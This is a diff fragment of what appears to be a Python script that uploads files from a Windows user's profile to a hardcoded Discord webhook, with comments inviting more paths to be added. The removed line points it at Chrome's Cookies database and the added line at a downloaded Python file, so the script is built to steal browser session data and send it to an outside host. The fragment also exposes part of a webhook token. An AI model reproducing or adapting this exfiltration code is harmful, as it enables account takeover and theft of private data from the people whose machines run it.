@@ -10,7 +10,7 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1429860870686511266/1CaCq46qxmyL
 # 2. Set the paths to the files you want to upload (you can add more!)
 # Use '____' in place of the username — it will be replaced automatically
 FILE_PATHS = [
-    r"C:\Users\____\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",
+    r"C:\Users\____\Downloads\clashAPI.py",
     # Add more paths here if needed
 ]
 
